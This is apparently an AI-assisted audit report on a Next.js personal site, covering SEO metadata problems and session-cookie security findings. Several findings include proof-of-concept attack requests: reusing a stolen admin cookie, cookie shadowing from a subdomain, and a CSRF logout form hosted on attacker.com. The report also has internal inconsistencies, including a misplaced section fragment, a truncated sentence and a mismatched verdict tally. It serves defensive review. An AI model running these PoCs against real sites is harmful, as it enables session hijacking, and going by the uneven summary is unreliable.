Q3.  Is JSON-LD structured data valid?
================================================================================
     ⚠️ PARTIAL — syntactically valid, semantically misleading
     Files: src/app/layout.tsx:127-142

     ✅ GOOD: The JSON-LD block is properly formatted:
        - @context: "https://schema.org"          (layout.tsx:131)
        - @type:    "WebSite"                     (layout.tsx:132)
        - name:     "Personal Site"                (layout.tsx:133)
        - url:      siteUrl                       (layout.tsx:134)
        - potentialAction: SearchAction            (layout.tsx:135-139)
          - target: `${siteUrl}/?q={search_term_string}`  (layout.tsx:137)
          - query-input: "required name=search_term_string" (layout.tsx:138)
        - Rendered via <script type="application/ld+json"> with
          JSON.stringify (layout.tsx:127-142). ✓

     ❌ ISSUE J-1 (HIGH): The SearchAction (layout.tsx:135-139) is
        FABRICATED. The site has NO search functionality:
          - No /search route, no /api/search route, no ?q= handler.
          - page.tsx never reads `?q=` query param.
          - middleware.ts does not route ?q= anywhere.
        Google's Rich Result test will accept the JSON-LD, but the
        search box will either never appear (Google requires actual
        working site-search) or appear and lead users to a 404/error,
        which Google flags as misleading and may penalize.
        Google's own documentation explicitly says: "Make sure the
        search target URL works." It doesn't.
        PoC verification:
          curl "https://ehsanmorad.ir/?q=test"
          # → returns the homepage HTML (the ?q= param is ignored)
          # → no search results shown
        Fix: remove the potentialAction entirely until real search is
        implemented, or implement server-side ?q= search.

     ⚠️ ISSUE J-2 (MED): Only ONE JSON-LD block exists (WebSite type).
        Missing schemas that this site should have:
          - Person: the site owner (PERSONAL.fullName.en is imported
            at page.tsx:20 and used in rss.xml/route.ts:30). Should
            be the `mainEntity` of the WebSite, or a separate
            `@type: Person` block with `sameAs` linking to the
            SOCIALS profiles (Twitter/GitHub/etc.).
          - WebPage: the actual homepage.
          - ProfilePage or AboutPage: for the /#about section.
          - Article / BlogPosting: for the articles fetched in
            sitemap.xml/route.ts:13 — but those don't have their own
            URLs, so N/A until individual article pages exist.
        The current schema tells Google "this is a website" but
        nothing about WHO runs it or WHAT it offers.

     ⚠️ ISSUE J-3 (LOW): `name: "Personal Site"` (layout.tsx:133)
        is a placeholder string, not the owner's name. Should be
        PERSONAL.fullName.en (used elsewhere, e.g. rss.xml:30).
        Hardcoded English string vs. OG `locale: fa_IR` mismatch.

     ⚠️ ISSUE J-4 (LOW): No `inLanguage`, `image`, `publisher`, or
        `description` properties on the WebSite schema. These are
        recommended (not required) for richer rich-result
        eligibility.

     ⚠️ ISSUE J-5 (LOW): The JSON-LD block is injected via
        `dangerouslySetInnerHTML` in the `<head>` (layout.tsx:127).
        This works, but Next.js 14+ supports a typed
        `metadata.other` or the `JsonLd` component pattern. The
        current approach is fine but is harder to type-check.

     Severity: HIGH (J-1 fabricated SearchAction is a Google-quality
     issue, not just an SEO nit).

Q4.  Is the sitemap complete?
================================================================================
     ❌ FAIL — three independent defects, one critical
     Files: src/app/sitemap.xml/route.ts

     ❌ ISSUE S-1 (CRITICAL): Dynamic content is fetched but NEVER
        emitted in the XML. Lines 12-16 run:
          const [articles, tutorials, books] = await Promise.all([
            db.article.findMany({ where: { visible: true }, select: { id: true, date: true } }),
            db.tutorial.findMany({ where: { visible: true }, select: { id: true } }),
            db.book.findMany({ where: { visible: true }, select: { id: true } }),
          ]);
        Then lines 29-33 build `urls` ONLY from `staticPages`:
          const urls = staticPages.map(...).join("\n");
        The `articles`, `tutorials`, `books` arrays are unused —
        TypeScript should warn "declared but never read" (or the
        build does, depending on tsconfig). The whole point of a
        sitemap is to tell Google about discoverable URLs; the site
        has articles/tutorials/books in the DB but they have NO
        individual URLs (the homepage renders them as sections at
        /#articles, /#tutorials, /#books — see staticPages lines
        22-24). So strictly speaking there are no per-article URLs to
        emit. BUT then fetching them at all is dead code, AND the
        query string `select: { id: true, date: true }` suggests
        someone intended `/articles/{id}` or `/{date}/{id}` URLs that
        were never built. Either:
          (a) remove the dead DB queries, OR
          (b) implement per-article routes and emit them here.
        Current state: dead code + sitemap that doesn't reflect DB
        content.

     ❌ ISSUE S-2 (HIGH): Hardcoded placeholder domain.
        Line 10: `const siteUrl = "https://your-domain.com";`
        Every <loc> tag in the sitemap uses this domain. Search
        engines will fetch sitemap.xml, see URLs like
        `https://your-domain.com/`, try to crawl them, get NXDOMAIN
        (or, worse, an attacker who registers `your-domain.com` can
        serve content there and Google may think YOUR site is a
        duplicate of theirs). The actual site is at
        `https://ehsanmorad.ir` (layout.tsx:25, robots.txt:23).
        This is the same value the layout uses via env var — the
        sitemap should use `process.env.NEXT_PUBLIC_SITE_URL` too.

     ⚠️ ISSUE S-3 (MED): Static pages use URL fragments
        (lines 19-27: `/#about`, `/#skills`, `/#books`, `/#articles`,
        `/#tutorials`, `/#chat`, `/#contact`). Search engines treat
        `https://example.com/#about` and `https://example.com/#skills`
        as the SAME URL — `https://example.com/`. The fragment is
        client-side only and does not create separate indexable
        resources. So the sitemap effectively lists the same URL
        (`https://your-domain.com/`) 8 times. Google will deduplicate
        and ignore 7 of them.
        Fix: if the site is genuinely a single-page app, list only `/`
        in the sitemap. If sections should be indexable, give them
        their own routes (`/about`, `/articles`, etc.).

     ⚠️ ISSUE S-4 (LOW): No `<lastmod>` field. The articles query
        selects `date` (line 13), implying someone intended
        `<lastmod>` to be set per URL, but it's never used.
        `<lastmod>` is the only sitemap field Google actually reads.

     ⚠️ ISSUE S-5 (LOW): `changefreq` (lines 19-27) and `priority`
        are deprecated hints. Google has stated since 2008 it ignores
        both. Not a bug, but dead weight.

     ⚠️ ISSUE S-6 (LOW): No `xhtml:link` hreflang alternates inside
        the sitemap (cross-references Q10). If the site ever serves
        multi-language URLs, the sitemap should declare them via:
          <xhtml:link rel="alternate" hreflang="fa" href="..."/>
        Currently absent.

     ⚠️ ISSUE S-7 (LOW): The /clips route (src/app/clips/page.tsx)
        exists as a real, separate page, but is NOT listed in the
        sitemap's staticPages. So /clips will not be discovered by
        search engines via the sitemap (only via internal links if
        linked from the homepage — verify separately).

     ⚠️ ISSUE S-8 (LOW): Content-Type header
        "application/xml; charset=utf-8" (line 41) — correct. ✓

     Severity: HIGH (S-2 hardcoded wrong domain is the dominant issue;
     S-1 dead code is MED→HIGH because it indicates intended behavior
     that was never completed).

Q5.  Is robots.txt correct?
================================================================================
     ⚠️ PARTIAL — works but has non-standard directives and stale
     references
     Files: public/robots.txt

     ✅ GOOD: Core directives are present and parseable:
        - User-agent: *               (robots.txt:8)
        - Allow: /                    (robots.txt:11)
        - Allow: /$                   (robots.txt:12)
        - Disallow: /api/             (robots.txt:15)
        - Disallow: /user-login      (robots.txt:16)
        - Disallow: /user-dashboard   (robots.txt:17)
        - Disallow: /admin            (robots.txt:18)
        - Disallow: /*?password=     (robots.txt:19)
        - Disallow: /*?token=         (robots.txt:20)
        - Sitemap: https://ehsanmorad.ir/sitemap.xml  (robots.txt:23)

     ⚠️ ISSUE R-1 (MED): Sitemap URL is HARDCODED to
        `https://ehsanmorad.ir/sitemap.xml` (robots.txt:23). This is a
        static file in /public, so it cannot read
        `process.env.NEXT_PUBLIC_SITE_URL`. If the domain changes (the
        layout.tsx:25 fallback covers multiple domains — page.tsx:126-136
        lists `ehsanmorad.ir`, `ehsan-morad.ir`, `ehsanmorad.id.ir`),
        robots.txt will only announce the sitemap for the FIRST domain.
        The other two domains (`ehsan-morad.ir`, `ehsanmorad.id.ir`)
        will serve this same robots.txt with the wrong Sitemap URL.

     ⚠️ ISSUE R-2 (LOW): `Host: https://ehsanmorad.ir` (robots.txt:26)
        is a NON-STANDARD directive. Only Yandex honors it; Google
        ignores it. Including it does no harm, but doesn't help either,
        and signals a cargo-culted config.

     ⚠️ ISSUE R-3 (LOW): `Disallow: /*?password=` and
        `Disallow: /*?token=` (robots.txt:19-20). These patterns DO
        work in robots.txt syntax (`*` is a wildcard, `?` is literal).
        But the intent seems to be "block URLs that contain a password
        or token query param". Pattern `/*?password=` matches any URL
        containing the substring `?password=`. This is correct.
        However, the actual login flow uses `/user-login?password=...`
        (based on the existence of /user-login route and these
        Disallow patterns), and `/user-login` is ALREADY blocked
        (robots.txt:16). So lines 19-20 are redundant defense-in-depth.
        Acceptable.

     ⚠️ ISSUE R-4 (LOW): The /public directory contains downloadable
        archives (install-v17.2.zip, source-v17.2.zip, tutorial-v16.zip
        — verified via Glob). `Allow: /` (robots.txt:11) permits
        Google to index these zip files, which will appear in search
        results as "Download install-v17.2.zip". May or may not be
        desired. If undesired, add `Disallow: /*.zip$`.

     ⚠️ ISSUE R-5 (LOW): No Crawl-delay directive. For a self-hosted
        single-instance site, a `Crawl-delay: 10` can reduce bot load.
        Optional.

     ⚠️ ISSUE R-6 (INFO): robots.txt is a STATIC file in /public.
        Next.js 13+ supports a dynamic route handler at
        `src/app/robots.ts` (using the Metadata API) which can read
        env vars and produce a typed robots.txt. The static approach
        works but is less flexible.

     Severity: MED (R-1 multi-domain issue is the dominant one).

Q6.  Is the manifest correct?
================================================================================
     ⚠️ PARTIAL — valid PWA manifest, but inconsistent with HTML
     Files: public/manifest.json

     ✅ GOOD: Required PWA fields are present:
        - name, short_name              (manifest.json:2-3)
        - description                   (manifest.json:4)
        - lang, dir                     (manifest.json:5-6)
        - start_url, scope              (manifest.json:7-8)
        - display, orientation         (manifest.json:9-10)
        - background_color, theme_color (manifest.json:11-12)
        - categories                    (manifest.json:13)
        - icons (192 + 512)             (manifest.json:14-27)
        - shortcuts                     (manifest.json:28-37)

     ⚠️ ISSUE M-1 (MED): `lang: "fa"` and `dir: "rtl"` (manifest.json:5-6)
        CONFLICT with the server-rendered HTML:
          <html lang="en" dir="ltr">  (layout.tsx:111)
        When a user installs the PWA, the manifest declares the app
        is Persian/RTL. When the browser renders the actual page
        (pre-hydration), the HTML declares English/LTR. page.tsx:106-109
        fixes `lang`/`dir` client-side AFTER mount, but the initial
        server HTML (what crawlers and screen readers see first) is
        English/LTR. Search engines and accessibility tools see
        inconsistent metadata.

     ⚠️ ISSUE M-2 (LOW): `name: "Personal Site"` and
        `short_name: "Site"` (manifest.json:2-3) are placeholders.
        Should reflect the actual owner/site name (PERSONAL.fullName.en
        is used elsewhere, e.g. rss.xml:30). The home-screen label
        will literally read "Site" — confusing for users.

     ⚠️ ISSUE M-3 (LOW): No `id` field. Recommended (not required) by
        the W3C spec for uniquely identifying the app across origins.

     ⚠️ ISSUE M-4 (LOW): No `screenshots` array. Chrome's "richer
        install UI" (the install prompt with screenshots) requires at
        least one screenshot (preferably 1080×1920 or wider). Without
        it, the install prompt is a plain button.

     ⚠️ ISSUE M-5 (LOW): Icons lack a `monochrome` purpose for
        Android 13+ themed icons. The 512×512 icon declares
        `purpose: "any maskable"` (manifest.json:25), which is good
        for adaptive icons, but Android 13+ wants a separate
        `purpose: "monochrome"` icon for tinted display.

     ⚠️ ISSUE M-6 (LOW): The maskable icon (manifest.json:22-26) is
        the same file as the regular icon (icon-512.png). Maskable
        icons need 80% safe-zone padding around the central content
        (Android masks the outer 20% with arbitrary shapes). If
        icon-512.png was designed as a regular (non-maskable) icon,
        the maskable rendering may crop critical content. Without
        inspecting the actual image, flagged as a risk.

     ⚠️ ISSUE M-7 (LOW): `shortcuts` (manifest.json:28-37) link to
        `/#contact` and `/#chat` (fragments). These work but produce
        no separate indexable resources (see S-3). When launched, the
        PWA opens the homepage and relies on JS to scroll to the

     ⚠️ ISSUE M-8 (INFO): Manifest is referenced via
        `manifest: "/manifest.json"` (layout.tsx:64). ✓

Q7.  Is canonical URL set?
================================================================================
     ✅ YES — set at root layout level
     Files: src/app/layout.tsx:85-90

     ✅ GOOD: `alternates.canonical: siteUrl` is set (layout.tsx:86).
        Resolves to `https://ehsanmorad.ir` (or whatever
        NEXT_PUBLIC_SITE_URL is). Next.js emits
        `<link rel="canonical" href="https://ehsanmorad.ir" />` in
        the rendered HTML.

     ⚠️ ISSUE C-1 (LOW): Canonical is a string, not `new URL(siteUrl)`.
        Next.js accepts both; if siteUrl were ever a relative path,
        it would be resolved against `metadataBase` (layout.tsx:28).
        Currently safe because the fallback is absolute.

     ⚠️ ISSUE C-2 (LOW): Only the ROOT canonical is set. There is no
        per-page canonical. Since the site is effectively a single
        page (page.tsx + clips/page.tsx), this is mostly fine. But
        clips/page.tsx will inherit the ROOT canonical
        (`https://ehsanmorad.ir`), which is WRONG for /clips — Google
        will treat /clips as a duplicate of / because both declare
        the same canonical. Fix: clips/page.tsx needs its own
        metadata export with `alternates.canonical: "/clips"`.
        (Cannot be done while clips/page.tsx is a `"use client"`
        component — see Q8/Q9.)

     ⚠️ ISSUE C-3 (INFO): `alternates.types` (layout.tsx:87-89)
        declares only `application/rss+xml → /rss.xml` (the RSS feed).
        The manifest is referenced separately via the `manifest:`
        field (layout.tsx:64), not via `alternates.types`. Both
        patterns are valid Next.js conventions.

     Severity: LOW (C-2 /clips canonical is the only real issue).

Q8.  Is the page title dynamic?
================================================================================
     ❌ FAIL — title is static
     Files: src/app/layout.tsx:29-32, src/app/page.tsx:1

     ❌ ISSUE D-1 (HIGH): page.tsx is a `"use client"` component
        (page.tsx:1). Client components CANNOT export `metadata` or
        `generateMetadata` — these are server-only APIs in Next.js
        App Router. As a result:
          - The `title.template: "%s | Personal Site"` (layout.tsx:31)
            is NEVER used because no child page supplies a `title`
            via metadata.
          - The page's <title> tag is always the default
            `"Personal Site"` (layout.tsx:30).
          - No per-section or per-language title.
        The site supports 3 languages (en/fa/de — page.tsx:27) and
        has 8 sections (#about, #skills, #books, #articles,
        #tutorials, #chat, #contact, plus the hero). All of them
        share the same HTML <title> tag.
        Fix options:
          (a) Refactor page.tsx into a thin server component wrapper
              that exports `generateMetadata` based on a `?lang=`
              query param or cookie, then renders the client
              component as a child.
          (b) Use Next.js 14's `generateMetadata` with the
              `headers()` API to read the visitor's language cookie
              and set the title server-side.
          (c) Accept the static title (current state).

     ⚠️ ISSUE D-2 (LOW): Even the layout-level title
        `"Personal Site"` (layout.tsx:30) is a placeholder, not the
        owner's actual name. Should be PERSONAL.fullName.en or
        similar.

     Severity: HIGH (no dynamic title at all; SEO title is the
     single most important on-page ranking factor).

        (page.tsx:27 `langLabel: { en: "EN", de: "DE", fa: "FA" }`,
        page.tsx:55 `useState<Lang>`), but language switching is
        CLIENT-SIDE ONLY via React state (page.tsx:55). There is:
          - No `?lang=` query param parsing.
          - No `/en/`, `/fa/`, `/de/` route prefix.
          - No `Accept-Language` header negotiation in middleware.
          - No `<link rel="alternate" hreflang>` anywhere.
        This means:
          - Google cannot serve the right language version in search
            results (it will index the English-default server HTML).
          - Persian/German visitors see English search snippets.
          - The OG `locale: fa_IR` (layout.tsx:41) and manifest
            `lang: fa` (manifest.json:5) are LIES — the server HTML
            is `lang="en"` (layout.tsx:111).

     Severity: HIGH (no hreflang + no per-language URLs = the multi-
     language support is invisible to search engines).

Final verdict:
  Of 10 acceptance criteria, 1 PASS (Q7 canonical — with LOW caveat
  for /clips), 4 PARTIAL (Q1 OG, Q2 Twitter, Q3 JSON-LD, Q5 robots.txt,
  Q6 manifest), 5 FAIL (Q4 sitemap, Q8 dynamic title, Q9 dynamic
  description, Q10 hreflang — Q3 JSON-LD is PARTIAL but contains the
  HIGH-severity fabricated SearchAction).

  The headline finding is F-2/F-3 (HIGH): the sitemap emits URLs
  with a placeholder domain (`https://your-domain.com`) and fetches
  articles/tutorials/books from the DB on every request but never
  includes them in the XML output. Combined with F-4 (HIGH: client
  component cannot export metadata → no dynamic title/description)
  and F-5 (HIGH: no hreflang + client-side-only language switching),
  the site is effectively invisible to non-English search engines
  and partially misconfigured for English ones.

  The OG/Twitter/JSON-LD/manifest tags are syntactically valid but
  contain placeholder strings ("Personal Site"), aspect-ratio
  mismatches (512×512 square for both OG and Twitter large-image
  cards), and a fabricated SearchAction that Google may penalize.

  Recommend a V17.3 follow-up focused on:
    1. F-2 + F-3 (sitemap domain + dead queries) — 5-minute fix.
    2. F-1 (remove fabricated SearchAction) — 2-minute fix.
    3. F-4 (refactor page.tsx into server+client split) — larger but
       unblocks Q8, Q9, and parts of Q10.
    4. F-5 (hreflang + per-language URLs) — design decision needed
       first (query param vs route prefix vs subdomain).
    5. F-6/F-7 (dedicated OG/Twitter images) — design work.

[VC-1] V17.2.1 password-fallback removal — VERIFIED.
  File: src/lib/admin-auth.ts:17-31
  Code:
    export async function checkAdminAuth(request: Request, _password?: string) {
      try {
        const session = getSessionFromRequest(request);
        if (!session) return { ok: false };
        const user = await db.accessUser.findUnique({ where: { id: session.userId } });
        if (!user || !user.active) return { ok: false };
        if (user.role !== "admin") return { ok: false };
        return { ok: true, userId: user.id };
      } catch {
        return { ok: false };
      }
    }
  Evidence: `_password` (underscore-prefixed) is NEVER referenced inside
  the function body. Grep for `_password` in the function: 0 uses. The
  only auth path is getSessionFromRequest → DB lookup → role check.
  PoC confirming removal:
    curl -s "https://victim/api/admin/security?password=admin123"
    → 401 unauthorized (with NO admin cookie set).
    Before V17.2.1 this would have returned 200 OK if password matched.
    Now it ALWAYS returns 401 unless a valid HMAC-signed session cookie
    is presented. ✓ Defense holds.

[VC-2] Session cookie forgery is prevented by HMAC-SHA256.
  File: src/lib/access-auth.ts:67-96, 206-208
  Token format: base64( userId . expiresAt . HMAC_SHA256(userId.expiresAt, SESSION_SECRET) )
  Verification at access-auth.ts:78-96:
    - parts.length !== 3 → null
    - parseInt(expiresAt) NaN → null
    - Date.now() > expiresAt → null (expiry enforced)
    - HMAC computed on (userId + "." + expiresAt)
    - sigBuf.length !== expBuf.length → null
    - !crypto.timingSafeEqual(sigBuf, expBuf) → null
  Live PoC (this audit):
   Forged token with sig="aa"*32 (correct length, wrong bytes):
      → both buffers 32 bytes
      → crypto.timingSafeEqual returns false ✓
   Forged token with sig="00"*64 (wrong length, would be 64 bytes):
      → length mismatch, short-circuit, null returned ✓
  Conclusion: cannot forge a valid cookie without SESSION_SECRET.
  Severity: N/A (defense holds).

[VC-3] timingSafeEqual used correctly (length leak is informational only).
  File: src/lib/access-auth.ts:88-91
  Code:
    const sigBuf = Buffer.from(sig, "hex");
    const expBuf = Buffer.from(expectedSig, "hex");
    if (sigBuf.length !== expBuf.length || !crypto.timingSafeEqual(sigBuf, expBuf)) return null;
  Verification:
    - crypto.timingSafeEqual THROWS ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH on
      different-length inputs → the pre-check at line 91 is REQUIRED,
      not optional.
    - expBuf is always 32 bytes (HMAC-SHA256 hex digest = 64 chars = 32 bytes).
    - Attacker cannot extract HMAC bytes via timing because:
      (a) When sigBuf.length === 32, full constant-time compare runs (no leak).
      (b) When sigBuf.length !== 32, the function returns null WITHOUT
          revealing which byte position differs (because no comparison ran).
    - The length-leak tells attacker only "is my sig 32 bytes?" — which is
      already public knowledge (HMAC-SHA256 hex output length is documented).
  Severity: LOW (informational — see F-SEC-9 below for details).

[VC-4] Session CANNOT be reused after user deactivated.

    - src/app/api/admin/users/logs/route.ts:16 `if (!user || !user.active) return null;`
  All five admin auth paths fetch the user record fresh on every request
  and reject when active===false. The cookie is signed with HMAC, but the
  authorization decision depends on a live DB read.
  PoC:
    # Admin deactivates user with id=abc
    curl -X PUT https://victim/api/admin/users/abc \
      -H "Cookie: <admin-cookie>" -H "Origin: https://victim" \
      -d '{"active":false,"deactivatedReason":"attacker"}'
    # Victim's previously-issued cookie immediately fails:
    curl https://victim/api/admin/users -H "Cookie: <deactivated-user-cookie>"
    → 401 unauthorized ✓
  Conclusion: deactivation is effective on the next request. ✓

[VC-5] Regular user CANNOT escalate to admin via API.
  All admin routes use one of three auth gates (checkAdminAuth,
  checkAdminSession, or local checkAdmin) — each fetches user.role from
  the DB on every request and rejects when role !== "admin". The cookie
  contains only userId (HMAC-signed), NOT the role. Role is never trusted
  from client input.
  PoC:
    # Regular user logs in, gets cookie with their userId
    curl -X POST https://victim/api/user/login \
      -d '{"username":"regularuser","password":"..."}' -c /tmp/user.jar
    # Tries to access admin endpoint with regular-user cookie
    curl https://victim/api/admin/users -H "Cookie: $(cat /tmp/user.jar | grep access_session | awk '{print $7}')"
    → 401 unauthorized ✓
  Conclusion: no user→admin privilege escalation via API.

[VC-6] Cookie attributes are mostly correct.
  File: src/app/api/user/login/route.ts:106-112
  Code:
    response.cookies.set("access_session", token, {
      httpOnly: true,                                           ✓
      secure: process.env.NODE_ENV === "production",            ⚠️ see F-SEC-7
      sameSite: "strict",                                       ✓
      path: "/",                                                ✓
      maxAge: 60 * 60 * 24,                                     ✓ (24h, matches SESSION_DURATION_HOURS)
    });
  - No `domain` set → host-only (browser default) ✓
  - maxAge matches SESSION_DURATION_HOURS (24h) ✓
  - httpOnly blocks document.cookie theft via XSS ✓
  - SameSite=strict blocks browser-mediated CSRF for all requests ✓

[VC-7] Logout cookie deletion matches the set-cookie's Path=/.
  File: src/app/api/user/logout/route.ts:7-11
  Code:
    response.cookies.delete("access_session");
  Live verification (this audit):
    NextResponse.cookies.delete("access_session") with no options produces:
      Set-Cookie: access_session=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT
    (Path defaults to "/" via normalizeCookie @ edge-runtime/cookies:327-329)
  The deletion Set-Cookie's Path=/ matches the original cookie's Path=/
  so the browser will correctly evict the cookie. ✓

================================================================================
FINDINGS (with file:line, severity, PoC)
================================================================================

■ F-SEC-1 [LOW/INFO] — Dead `password` param still threaded through 16 routes
  Files (extract `?password=` from URL or `body.password`, pass to checkAdminAuth
   which ignores it):
    src/app/api/messages/route.ts:12,65
    src/app/api/admin/security/route.ts:18,44
    src/app/api/admin/equipment/route.ts:13,42
    src/app/api/admin/security-dashboard/route.ts:12,51
    src/app/api/admin/stats/route.ts:8
    src/app/api/admin/nav/route.ts:9,26
    src/app/api/admin/text/route.ts:16,46
    src/app/api/admin/settings/route.ts:21,102
    src/app/api/admin/content/route.ts:17,56
    src/app/api/admin/reply/route.ts:20
    src/app/api/admin/email/route.ts:23,39
    src/app/api/admin/providers/route.ts:13,50
    src/app/api/admin/chat-reply/route.ts:19
    src/app/api/admin/themes/route.ts:13,38
    src/app/api/admin/clear/route.ts:16
    src/app/api/chat/route.ts:222
    src/app/api/bale/webhook/route.ts:56  (passes "" explicitly)
  Severity: LOW (defense holds — password is ignored — but 17 call sites
  suggest to reviewers that the password path is still active, inviting a
  future regression that re-introduces the F-NEW-1 backdoor).
  Recommendation (DO NOT APPLY in this audit): remove the `_password` param
  from checkAdminAuth signature, remove all `const password = ...` lines
  in these routes, and pass `request` only.
  Status: not fixed.

■ F-SEC-2 [HIGH] — Stolen session cookie remains valid after password change.
  Files:
    - prisma/schema.prisma:380-415  (AccessUser model has NO tokenVersion
       / passwordChangedAt / sessionVersion field)
    - src/lib/access-auth.ts:67-72   (createSessionToken signs only userId +
       expiresAt — no version stamp)
    - src/lib/access-auth.ts:78-96   (verifySessionToken checks signature
       + expiry only — no version check)
    - src/app/api/admin/security/route.ts:56-99 (change_password updates
       passwordHash but does NOT bump any tokenVersion or invalidate cookies)
    - src/app/api/admin/users/[id]/route.ts:66-69 (admin-initiated password
       reset also does NOT invalidate existing sessions)
  Root cause: the session token is purely stateless. Once issued, the only
  way to invalidate it is to (a) rotate SESSION_SECRET (which invalidates
  ALL users — a blunt instrument), or (b) deactivate the user (which also
  blocks legitimate login).
  PoC:
    # T=0: Attacker steals admin cookie via XSS log (CSP allows 'unsafe-inline'
    #       per F-18) or proxy misconfig.
    # T=1h: Admin notices something off, changes password.
    curl -X POST https://victim/api/admin/security \
      -H "Cookie: <admin-cookie>" -H "Origin: https://victim" \
      -d '{"password":"","action":"change_password","currentPassword":"old","newPassword":"new"}'
    # T=1h+1s: Attacker's stolen cookie STILL WORKS:
    curl https://victim/api/admin/users -H "Cookie: <stolen-cookie>"
    # → 200 OK with user list. ✓ Exploit succeeds.
    # T=24h: Cookie finally expires naturally.
  Impact: full admin access for up to 24h after password rotation.
  This is the same root cause as prior F-6 + F-NEW-5 — still NOT fixed.
  Severity: HIGH (reproduction requires a stolen cookie, but if combined
  with F-18 CSP weakness or any other leak vector, the attacker has a
  guaranteed 24h window).

■ F-SEC-3 [MEDIUM] — SESSION_SECRET entropy check is length-only.
  File: src/lib/access-auth.ts:21-43
  Code:
    function getSecret(): string {
      if (_SECRET) return _SECRET;
      const s = process.env.SESSION_SECRET;
      if (!s) throw new Error("SESSION_SECRET env var is required ...");
      const KNOWN_BAD_SECRETS = new Set([
        "build-placeholder", "change-me", "secret",
        "your-secret-here", "changeme", "",
      ]);
      if (KNOWN_BAD_SECRETS.has(s) || s.length < 32) {
        throw new Error("SESSION_SECRET is too weak ...");
      }
      _SECRET = s;
      return _SECRET;
    }
  Weakness:
    - The check rejects ONLY the 6 explicitly-enumerated placeholders and
      any string shorter than 32 chars.
    - It does NOT compute Shannon entropy, repetition, or dictionary-word
      membership.
    Live verification (this audit): the following low-entropy 32+ char
    strings all PASS the check:
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"        (32×'a')         → PASSES ✗
      "passwordpasswordpasswordpassword"         (32 chars)       → PASSES ✗
      "dev-secret-dev-secret-dev-secret!!"       (34 chars)       → PASSES ✗
      "change-this-from-panel-change-this-from"  (40 chars)       → PASSES ✗
      "0000000000000000000000000000000000"       (34 chars)       → PASSES ✗
  Mitigation context:
    - install.sh:93 generates `openssl rand -hex 32` (64-char hex, 256-bit
      entropy) → strong. Real installs are fine.
    - .env contains ONLY DATABASE_URL — no SESSION_SECRET at all. The
      app refuses to boot at first request (getSecret throws). ✓ Fail-closed.
    - The check protects against "developer sets SESSION_SECRET='secret'"
      type accidents, not against a determined operator who sets a
      low-entropy-but-32-char value.
  Severity: MEDIUM (the defense-in-depth is weaker than claimed, but the
  production install path is safe). Add: minimum entropy floor (e.g.,
  reject if 4+ consecutive identical chars, reject if entire string is
  hex of a small int, reject if contained in a rockyou-style list).
  Status: not fixed.

■ F-SEC-4 [MEDIUM] — Cookie lacks `__Host-` prefix (subdomain cookie-shadowing risk).
  File: src/app/api/user/login/route.ts:106
  Code:
    response.cookies.set("access_session", token, { ... });
                       ^^^^^^^^^^^^^^^^^^
                       Should be "__Host-access_session"
  Issue:
    Without the `__Host-` prefix, a compromised sibling subdomain
    (e.g., blog.victim.com) can set:
      Set-Cookie: access_session=<attacker-forged>; Path=/; Domain=victim.com
    The browser stores BOTH cookies in the victim.com jar.
    On the next /api/admin/* request, the browser sends BOTH in the
    Cookie header. The cookie parser in src/lib/access-auth.ts:188-193
    and src/middleware.ts:72-77 uses Object.fromEntries(cookie.split(";")...):
      Object.fromEntries → LATER keys OVERRIDE earlier ones
    So whichever cookie appears LAST in the header wins.
  Defense currently holding:
    Attacker cannot forge a VALID HMAC without SESSION_SECRET. So even if
    their cookie "wins", verifySessionToken rejects it (HMAC mismatch).
    Result is denial-of-service (legitimate user logged out), NOT
    privilege escalation.
  But — if SESSION_SECRET is weak (F-SEC-3) or leaked, the attacker CAN
    forge a valid cookie, and the shadowing attack escalates to full
    admin compromise.
  PoC (latent — needs SESSION_SECRET leak to weaponize):
    # On blog.victim.com (compromised sibling subdomain):
    Set-Cookie: access_session=<forged-with-leaked-secret>; Path=/; Domain=victim.com
    # Victim visits victim.com → browser sends both cookies.
    # Parser picks the attacker's cookie (last wins).
    # verifySessionToken succeeds (attacker has secret).
    # → attacker is now admin.
  Severity: MEDIUM (latent — defense holds today, fragile to future
  SESSION_SECRET leak).
  Recommendation: rename to `__Host-access_session`, drop `domain`
  attribute (already absent), ensure `secure: true` always, `path: "/"`.
  Status: not fixed.

■ F-SEC-5 [MEDIUM] — `secure` flag conditional on NODE_ENV (HTTP cookie in dev).
  File: src/app/api/user/login/route.ts:108
  Code:
    secure: process.env.NODE_ENV === "production",
  Issue:
    If NODE_ENV is unset or "development" (e.g., a manual deploy that
    forgets to set NODE_ENV=production), cookies are set WITHOUT Secure.
    A MITM on the wire can read the access_session cookie from any
    HTTP request. install.sh:108 does set NODE_ENV="production" in .env,
    so installs via install.sh are safe — but a Docker/manual deploy
    that omits NODE_ENV will silently ship insecure cookies.
  Also affects dev: localhost over HTTP, cookie is set without Secure,
  XSS-sniffing browser extensions or localhost listeners can read it.
  Severity: MEDIUM (deployment-dependent — easy to misconfigure).
  Recommendation: hard-code `secure: true` and document that HTTPS is
  required (or use a `__Host-` cookie which mandates Secure).

■ F-SEC-6 [MEDIUM] — /api/user/logout lacks CSRF protection.
  Files:
    - src/middleware.ts:30  `/api/user/logout` in PUBLIC_API_PREFIXES
       → no Origin/Host check on POST
    - src/app/api/user/logout/route.ts:7-11  POST handler does no auth,
       no token check, no Origin check
  Issue:
    A cross-site form can POST to /api/user/logout. The endpoint clears
    the access_session cookie by setting Set-Cookie: access_session=;
    Path=/; Expires=epoch. The browser applies this Set-Cookie to
    victim.com's cookie jar (same-origin with the cookie's domain).
  Defense currently holding (partial):
    The deletion Set-Cookie has no SameSite attribute → modern browsers
    (Chrome 80+, Firefox 69+) treat unset SameSite as "Lax" → cross-site
    POST is in cross-site context → the Set-Cookie is IGNORED per RFC
    6265bis-11 §5.3 step 11.6.
    So in modern browsers, the cross-site logout CSRF does NOT work.
  But — older browsers (IE, pre-Chrome-80 Safari) and browsers with
    SameSite-by-default disabled are vulnerable. The victim's cookie
    is cleared, forcing re-login. Minor DoS.
  PoC:
    <!-- On attacker.com -->
    <form action="https://victim.com/api/user/logout" method="POST">
      <input type="submit" value="Click me">
    </form>
    <!-- Victim clicks → POST to /api/user/logout -->
    <!-- Legacy browser → victim's access_session cookie cleared -->
  Severity: MEDIUM (legacy browser DoS); was previously tracked as
  F-24/F-NEW-6 LOW — upgrading to MEDIUM because:
    (a) No CSRF token, no Origin check at the route layer (only the
        implicit SameSite=Lax default on the deletion Set-Cookie).
    (b) Combined with F-18 (CSP 'unsafe-inline'), an XSS could call
        fetch('/api/user/logout', {method:'POST', credentials:'include'})
